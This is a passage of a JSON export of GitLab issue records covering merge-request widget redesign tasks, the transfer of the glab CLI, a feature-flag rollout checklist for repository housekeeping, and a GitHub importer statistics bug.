Hughes","state":"active","avatar_url":"https://secure.gravatar.com/avatar/533a51534470a11062df393543eab649?s=80\u0026d=identicon","web_url":"https://gitlab.com/iamphill"},"labels":["Deliverable","auto updated","devops::create","feature::enhancement","frontend","group::code review","merge request widget","merge requests","section::dev","type::maintenance","workflow::in dev"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":113870,"username":"iamphill","name":"Phil Hughes","state":"active","avatar_url":"https://secure.gravatar.com/avatar/533a51534470a11062df393543eab649?s=80\u0026d=identicon","web_url":"https://gitlab.com/iamphill"}],"author":{"id":4414431,"username":"thomasrandolph","name":"Thomas Randolph","state":"active","avatar_url":"https://secure.gravatar.com/avatar/6462fcd577d8c957abd2dc23956cfbec?s=80\u0026d=identicon","web_url":"https://gitlab.com/thomasrandolph"},"type":"ISSUE","assignee":{"id":113870,"username":"iamphill","name":"Phil Hughes","state":"active","avatar_url":"https://secure.gravatar.com/avatar/533a51534470a11062df393543eab649?s=80\u0026d=identicon","web_url":"https://gitlab.com/iamphill"},"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353618","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353618","notes":"https://gitlab.com/api/v4/projects/278964/issues/353618/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353618/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353618","relative":"#353618","full":"gitlab-org/gitlab#353618"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5589,"epic":{"id":224926,"iid":5589,"title":"Restructure MR merge widget","url":"/groups/gitlab-org/-/epics/5589","group_id":9970,"human_readable_end_date":"Oct 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":102945984,"iid":353617,"project_id":278964,"title":"Import `glab` from Github to `gitlab-org/cli`","description":"As part of https://gitlab.com/groups/gitlab-org/-/epics/7514 and transitioning `glab` to GitLab the following steps need to be completed:\n\n - [x] Obtain maintainer access to https://github.com/profclems/glab\n - [x] Using the [Github importer](https://docs.gitlab.com/ee/administration/raketasks/github_import.html#github-import) import project to `\u003cGitLab Team Member\u003e/glab`\n - [x] [Transfer project](https://docs.gitlab.com/ee/user/project/settings/#transferring-an-existing-project-into-another-namespace) from `\u003cGitLab Team Member\u003e/glab` to `gitlab-org/cli`\n\n**`gitlab-org/cli` will be the new canonical home for the the GitLab CLI.**\n\n### Additional Notes/Considerations\n\n - When the project is transitioned, CI will break and we'll need to update it before we're able to publish any new versions.\n - Clement may wish to keep a version at `github.com/profclems/glab` - this should be evaluated as a mirror or a fork.\n\n### Questions\n\n - Should we initially transition the project as private to allow time to get through the housekeeping work?","state":"closed","created_at":"2022-02-23T18:17:55.784Z","updated_at":"2022-10-20T21:45:55.726Z","closed_at":"2022-03-21T21:07:42.037Z","closed_by":{"id":2935693,"username":"phikai","name":"Kai Armstrong","state":"active","avatar_url":"https://secure.gravatar.com/avatar/2c5d6a63b41cbeb3ea4cccda82e758e1?s=80\u0026d=identicon","web_url":"https://gitlab.com/phikai"},"labels":["Deliverable","auto updated","backend","cli","devops::create","group::code review","section::dev","type::feature","workflow::in review"],"milestone":{"id":2204142,"iid":72,"group_id":9970,"title":"14.10","description":"","state":"active","created_at":"2021-08-26T19:12:33.701Z","updated_at":"2021-08-26T19:12:33.701Z","due_date":"2022-04-17","start_date":"2022-03-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/72"},"assignees":[{"id":40375,"username":"kerrizor","name":"Kerri Miller","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/40375/avatar.png","web_url":"https://gitlab.com/kerrizor"}],"author":{"id":2935693,"username":"phikai","name":"Kai Armstrong","state":"active","avatar_url":"https://secure.gravatar.com/avatar/2c5d6a63b41cbeb3ea4cccda82e758e1?s=80\u0026d=identicon","web_url":"https://gitlab.com/phikai"},"type":"ISSUE","assignee":{"id":40375,"username":"kerrizor","name":"Kerri Miller","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/40375/avatar.png","web_url":"https://gitlab.com/kerrizor"},"user_notes_count":16,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353617","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":3,"completed_count":3},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"3 of 3 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353617","notes":"https://gitlab.com/api/v4/projects/278964/issues/353617/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353617/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353617","relative":"#353617","full":"gitlab-org/gitlab#353617"},"severity":"UNKNOWN","moved_to_id":105235505,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":102945538,"iid":353615,"project_id":278964,"title":"[MR Widget Restructure] Merged: Move subtext into lower area","description":"### Problem\n\nThe `Merged` state MR Widget is still showing a second line of text, which should be part of the bullet points in the \"Merge Details\" section already in the gray \"well\" area in the bottom section.\n\n\u003cimg src=\"/uploads/779f5309bb61b9c08f7037715cf9c4bb/CleanShot_20211221123050.png\" width=\"750px\" /\u003e\n\n### Target\n\nThe `Merged` state should look like [the Figma design](https://www.figma.com/file/33KrJ7p9eTHlneMiSBDf57/Restructure-MR-merge-widget-%265589?node-id=1525%3A3815):\n\n\u003cimg src=\"/uploads/3e72ee4023f7b6d8121f0e9cabe864c3/image.png\" width=\"750px\" /\u003e\n\n#### Notes\n\nThe distinction between contexts is especially important here: in the `Merged` state, it only notes what did happen (merged, closed issues), not what would happen (commits added and removed, branch deletion).\n\n### See Also\n\n- [Spawning MR](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/71721)\n- [Parent Issue](https://gitlab.com/gitlab-org/gitlab/-/issues/344835), [specific comment](https://gitlab.com/gitlab-org/gitlab/-/issues/344835#note_791467355)","state":"closed","created_at":"2022-02-23T18:07:29.100Z","updated_at":"2022-05-24T12:00:24.525Z","closed_at":"2022-04-28T10:19:15.030Z","closed_by":{"id":113870,"username":"iamphill","name":"Phil Hughes","state":"active","avatar_url":"https://secure.gravatar.com/avatar/533a51534470a11062df393543eab649?s=80\u0026d=identicon","web_url":"https://gitlab.com/iamphill"},"labels":["Deliverable","devops::create","feature::enhancement","frontend","group::code review","merge request widget","merge requests","section::dev","type::feature","workflow::in review"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":113870,"username":"iamphill","name":"Phil Hughes","state":"active","avatar_url":"https://secure.gravatar.com/avatar/533a51534470a11062df393543eab649?s=80\u0026d=identicon","web_url":"https://gitlab.com/iamphill"}],"author":{"id":4414431,"username":"thomasrandolph","name":"Thomas Randolph","state":"active","avatar_url":"https://secure.gravatar.com/avatar/6462fcd577d8c957abd2dc23956cfbec?s=80\u0026d=identicon","web_url":"https://gitlab.com/thomasrandolph"},"type":"ISSUE","assignee":{"id":113870,"username":"iamphill","name":"Phil Hughes","state":"active","avatar_url":"https://secure.gravatar.com/avatar/533a51534470a11062df393543eab649?s=80\u0026d=identicon","web_url":"https://gitlab.com/iamphill"},"user_notes_count":5,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353615","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353615","notes":"https://gitlab.com/api/v4/projects/278964/issues/353615/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353615/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353615","relative":"#353615","full":"gitlab-org/gitlab#353615"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5589,"epic":{"id":224926,"iid":5589,"title":"Restructure MR merge widget","url":"/groups/gitlab-org/-/epics/5589","group_id":9970,"human_readable_end_date":"Oct 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":102944835,"iid":353610,"project_id":278964,"title":"[MR Widget Restructure] Closed: Move subtext into lower area","description":"### Problem\n\nThe `Closed` state MR Widget is still showing a second line of text, which should be part of the bullet points in the \"Merge Details\" section already in the gray \"well\" area in the bottom section.\n\n\u003cimg src=\"/uploads/ccf879f6327ad276c8d76b79414fadc4/CleanShot_20211221123042.png\" width=\"750px\" /\u003e\n\n### Target\n\nThe `Closed` state should look like [the Figma design](https://www.figma.com/file/omvNuR8nn90V8hjVN78OQO/Adapt-MR-merge-widget-to-framework-%23347128?node-id=1419%3A9022):\n\n\u003cimg src=\"/uploads/9b0189564a011f4ae93a5138718f33bb/image.png\" width=\"750px\" /\u003e\n\n#### Notes\n\nThe distinction between contexts is especially important here: in the `Closed` state, it only notes what did not happen (didn't merge, didn't close issues), not what would happen (commits added and removed, branch deletion).\n\n### See Also\n\n- [Spawning MR](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/71721)\n- [Parent Issue](https://gitlab.com/gitlab-org/gitlab/-/issues/344835), [specific comment](https://gitlab.com/gitlab-org/gitlab/-/issues/344835#note_791467355)","state":"closed","created_at":"2022-02-23T17:47:13.977Z","updated_at":"2022-05-24T12:00:24.615Z","closed_at":"2022-04-28T10:15:56.363Z","closed_by":{"id":113870,"username":"iamphill","name":"Phil Hughes","state":"active","avatar_url":"https://secure.gravatar.com/avatar/533a51534470a11062df393543eab649?s=80\u0026d=identicon","web_url":"https://gitlab.com/iamphill"},"labels":["Deliverable","auto updated","devops::create","feature::enhancement","frontend","group::code review","merge request widget","merge requests","section::dev","type::maintenance","workflow::in review"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":113870,"username":"iamphill","name":"Phil Hughes","state":"active","avatar_url":"https://secure.gravatar.com/avatar/533a51534470a11062df393543eab649?s=80\u0026d=identicon","web_url":"https://gitlab.com/iamphill"}],"author":{"id":4414431,"username":"thomasrandolph","name":"Thomas Randolph","state":"active","avatar_url":"https://secure.gravatar.com/avatar/6462fcd577d8c957abd2dc23956cfbec?s=80\u0026d=identicon","web_url":"https://gitlab.com/thomasrandolph"},"type":"ISSUE","assignee":{"id":113870,"username":"iamphill","name":"Phil Hughes","state":"active","avatar_url":"https://secure.gravatar.com/avatar/533a51534470a11062df393543eab649?s=80\u0026d=identicon","web_url":"https://gitlab.com/iamphill"},"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353610","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353610","notes":"https://gitlab.com/api/v4/projects/278964/issues/353610/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353610/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353610","relative":"#353610","full":"gitlab-org/gitlab#353610"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5589,"epic":{"id":224926,"iid":5589,"title":"Restructure MR merge widget","url":"/groups/gitlab-org/-/epics/5589","group_id":9970,"human_readable_end_date":"Oct 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":102943869,"iid":353607,"project_id":278964,"title":"[Feature flag] Rollout of `optimized_housekeeping`","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nThis issue is to rollout [the feature](ISSUE LINK) on production,\nthat is currently behind the `optimized_housekeeping` feature flag.\n\n\u003c!-- Short description of what the feature is about and link to relevant other issues. --\u003e\n\n## Owners\n\n- Team: Source Code\n- Most appropriate slack channel to reach out to: `#g_create_source-code-be`\n- Best individual to reach out to: @igor.drozdov \n\n## Stakeholders\n\n\u003c!--\nAre there any other stages or teams involved that need to be kept in the loop?\n\n- Name of a PM\n- The Support Team\n- The Delivery Team\n--\u003e\n\n## Expectations\n\n### What are we expecting to happen?\n\n\u003c!-- Describe the expected outcome when rolling out this feature --\u003e\n\n### When is the feature viable?\n\n\u003c!-- What are the settings we need to configure in order to have this feature viable? --\u003e\n\n\u003c!-- \nExample below:\n \n1. Enable service ping collection\n   `ApplicationSetting.first.update(usage_ping_enabled: true)`\n--\u003e\n\n### What might happen if this goes wrong?\n\n\u003c!-- Should the feature flag be turned off? Any MRs that need to be rolled back? Communication that needs to happen? What are some things you can think of that could go wrong - data loss or broken pages? --\u003e\n\n### What can we monitor to detect problems with this?\n\n\u003c!-- Which dashboards from https://dashboards.gitlab.net are most relevant? --\u003e\n_Consider mentioning checks for 5xx errors or other anomalies like an increase in redirects \n(302 HTTP response status)_\n\n### What can we check for monitoring production after rollouts?\n\n_Consider adding links to check for Sentry errors, Production logs for 5xx, 302s, etc._\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- Ensure that the feature MRs have been deployed to non-production environments.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [ ] Enable the feature globally on non-production environments.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e true --dev`\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e true --staging`\n- [x] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- If you're using [project-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [x] `/chatops run feature set --project=gitlab-org/gitlab \u003cfeature-flag-name\u003e true`\n    - [x] `/chatops run feature set --project=gitlab-org/gitlab-foss \u003cfeature-flag-name\u003e true`\n    - [x] `/chatops run feature set --project=gitlab-com/www-gitlab-com \u003cfeature-flag-name\u003e true`\n- If you're using [group-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --group=gitlab-org \u003cfeature-flag-name\u003e true`\n    - [ ] `/chatops run feature set --group=gitlab-com \u003cfeature-flag-name\u003e true`\n- If you're using [user-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --user=\u003cyour-username\u003e \u003cfeature-flag-name\u003e true`\n- [x] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [x] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [x] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [x] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [x] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com.\n- [ ] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [x] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e`\n  - Enable the feature globally on production environment.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e true`\n- [x] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [x] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can [create a separate issue](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `\u003cfeature-flag-name\u003e`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\nYou can either [create a follow-up issue for Feature Flag Cleanup](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Feature%20Flag%20Cleanup) or use the checklist below in this same issue.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [ ] Create a merge request to remove `\u003cfeature-flag-name\u003e` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --dev`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --staging`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set \u003cfeature-flag-name\u003e false\n```","state":"closed","created_at":"2022-02-23T17:26:32.914Z","updated_at":"2023-01-06T11:23:15.611Z","closed_at":"2023-01-06T11:21:16.490Z","closed_by":{"id":1161495,"username":"igor.drozdov","name":"Igor Drozdov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1161495/avatar.png","web_url":"https://gitlab.com/igor.drozdov"},"labels":["Category:Source Code Management","Deliverable","Technical Writing","backend","devops::create","documentation","feature flag","feature::addition","featureflag::production","group::source code","missed-deliverable","missed:14.10","missed:14.9","missed:15.0","missed:15.1","missed:15.2","missed:15.3","missed:15.4","missed:15.7","section::dev","type::feature","workflow::in review"],"milestone":{"id":2745648,"iid":83,"group_id":9970,"title":"15.8","description":"","state":"active","created_at":"2022-08-22T16:57:34.875Z","updated_at":"2022-08-22T16:57:34.875Z","due_date":"2023-01-17","start_date":"2022-12-18","expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/83"},"assignees":[{"id":1161495,"username":"igor.drozdov","name":"Igor Drozdov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1161495/avatar.png","web_url":"https://gitlab.com/igor.drozdov"},{"id":1902115,"username":"pks-t","name":"Patrick Steinhardt","state":"active","avatar_url":"https://secure.gravatar.com/avatar/0fec8836f293852876f02d1afd7f2aaf?s=80\u0026d=identicon","web_url":"https://gitlab.com/pks-t"}],"author":{"id":1161495,"username":"igor.drozdov","name":"Igor Drozdov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1161495/avatar.png","web_url":"https://gitlab.com/igor.drozdov"},"type":"ISSUE","assignee":{"id":1161495,"username":"igor.drozdov","name":"Igor Drozdov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1161495/avatar.png","web_url":"https://gitlab.com/igor.drozdov"},"user_notes_count":18,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353607","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":49,"completed_count":16},"weight":1,"blocking_issues_count":1,"has_tasks":true,"task_status":"16 of 49 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353607","notes":"https://gitlab.com/api/v4/projects/278964/issues/353607/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353607/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353607","relative":"#353607","full":"gitlab-org/gitlab#353607"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7629,"epic":{"id":450974,"iid":7629,"title":"Improve repository housekeeping by using OptimizeRepository RPC","url":"/groups/gitlab-org/-/epics/7629","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":null,"health_status":null},{"id":102941863,"iid":353596,"project_id":278964,"title":"Group:Secure Frontend Chapter - Document/Identify components that have cross team impacts","description":"With the [secure Group further transitioning to full Stack teams](https://gitlab.com/gitlab-org/secure/general/-/issues/209), the frontend engineers will spread. Some of them will be working in more or less frontend focussed teams others will be the only frontend experts in their team.\n\nTo battle the Isolation that comes along with that and to keep the important knowledge sharing amongst frontend engineers going, it will be important for us to identify UI components in the codebase that may impact other groups. \n\n## Purpose of issue\n\nTo provide a place for discussion to identify UI components that are shared between groups in Secure\n\n### Components that come to mind\n\n- MR widgets\n- Security configuration page\n- Shared survey banner\n- Security Badges\n- Project selector dropdowns","state":"closed","created_at":"2022-02-23T16:40:39.119Z","updated_at":"2022-07-11T02:53:51.857Z","closed_at":"2022-07-11T02:53:51.842Z","closed_by":{"id":3252080,"username":"farias-gl","name":"Fernando.A","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3252080/avatar.png","web_url":"https://gitlab.com/farias-gl"},"labels":["all Sec groups","auto updated","missed:14.10","missed:15.0","workflow::in review"],"milestone":{"id":2453024,"iid":74,"group_id":9970,"title":"15.2","description":"","state":"active","created_at":"2022-02-03T22:24:46.818Z","updated_at":"2022-02-03T22:26:32.010Z","due_date":"2022-07-17","start_date":"2022-06-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/74"},"assignees":[{"id":3252080,"username":"farias-gl","name":"Fernando.A","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3252080/avatar.png","web_url":"https://gitlab.com/farias-gl"}],"author":{"id":3252080,"username":"farias-gl","name":"Fernando.A","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3252080/avatar.png","web_url":"https://gitlab.com/farias-gl"},"type":"ISSUE","assignee":{"id":3252080,"username":"farias-gl","name":"Fernando.A","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3252080/avatar.png","web_url":"https://gitlab.com/farias-gl"},"user_notes_count":8,"merge_requests_count":0,"upvotes":2,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/353596","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/353596","notes":"https://gitlab.com/api/v4/projects/278964/issues/353596/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/353596/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#353596","relative":"#353596","full":"gitlab-org/gitlab#353596"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":102939024,"iid":353583,"project_id":278964,"title":"Github import: incorrect amount of imported issues in import status endpoint","description":"Endpoint `/projects/:id/import` currently reports incorrect amount of imported issues in the `stats` field.\n\nIn case of `rspec/rspec-mocks` repository import, following stats are returned:\n\n```json\n{\n    \"diff_note\": 2173,\n    \"issue\": 1459,\n    \"label\": 7,\n    \"milestone\": 10,\n    \"note\": 6259,\n    \"pull_request\": 873,\n    \"pull_request_merged_by\": 688,\n    \"pull_request_review\": 302,\n    \"release\": 11\n  }\n```\n\nField `issue` includes pull requests and issues combined instead of just issues.\n\nIt should actually be 1459 - 873 = `586`","state":"closed","created_at":"2022-02-23T15:51:50.429Z","updated_at":"2022-10-13T14:04:58.929Z","closed_at":"2022-10-10T09:22:12.960Z","closed_by":{"id":11982352,"username":"krisberry-ext","name":"Kristina Doskich","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11982352/avatar.png","web_url":"https://gitlab.com/krisberry-ext"},"labels":["Category:Importers","Importer:GitHub","Next Up","Observability","SoftServe::Import","backend","devops::manage","group::import","priority::2","section::dev","severity::3","type::bug","workflow::production"],"milestone":{"id":2453027,"iid":77,"group_id":9970,"title":"15.5","description":"","state":"active","created_at":"2022-02-03T22:29:56.909Z","updated_at":"2022-02-03T22:29:56.909Z","due_date":"2022-10-17","start_date":"2022-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/77"},"assignees":[{"id":11982352,"username":"krisberry-ext","name":"Kristina Doskich","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11982352/avatar.png","web_url":"https://gitlab.com/krisberry-ext"}],"author":{"id":8551613,"username":"acunskis","name":"Andrejs Cunskis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8551613/avatar.png","web_url":"https://gitlab.com/acunskis"},"type":"ISSUE","assignee":{"id":11982352,"username":"krisberry-ext","name":"Kristina 